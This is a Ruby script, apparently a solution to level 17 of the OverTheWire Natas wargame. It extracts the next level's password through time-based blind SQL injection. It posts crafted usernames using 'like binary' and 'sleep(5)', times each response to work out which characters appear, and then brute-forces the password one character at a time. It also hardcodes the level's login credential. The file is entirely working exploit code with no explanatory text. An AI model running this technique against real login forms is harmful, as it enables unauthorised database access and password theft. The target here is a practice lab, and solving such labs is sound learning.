require 'uri'
require 'net/http'

def post inject
    uri = URI.parse('http://natas17.natas.labs.overthewire.org')
    req = Net::HTTP::Post.new(uri)
    req.basic_auth("natas17", "XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd")
    req.set_form_data(
        "username" => 'natas18" and password like binary "' + inject + '%" and sleep(5) #'
    )
    stamp = Time.now
    res = Net::HTTP.start(uri.hostname, uri.port) do |http|
        http.request(req)
    end
    Time.now - stamp
end

def checkCharDomain
    chars = ""
    for i in (48..57).to_a + (65..90).to_a + (97..122).to_a
        injection = i.chr
        secs = post "%" + injection
        puts secs.to_s + " s --> " + injection
        if secs > 3
            chars = chars + i.chr
            puts "DOMAIN: " + chars
        end
    end
end

# Runnnig checkCharDomain will produce: 468DEFGJLNPQUVZagknoquvwx
# checkCharDomain

def brute
    domain = "468DEFGJLNPQUVZagknoquvwx".split ''
    pass = ""
    loop do
        finished = true
        for i in domain
            injection = pass + i
            secs = post injection
            puts secs.to_s + " s --> " + injection
            if secs > 3
                pass = pass + i
                puts pass
                finished = false
                break
            end
        end
        if finished
            puts "Finished: " + pass
            break
        end
    end
end

brute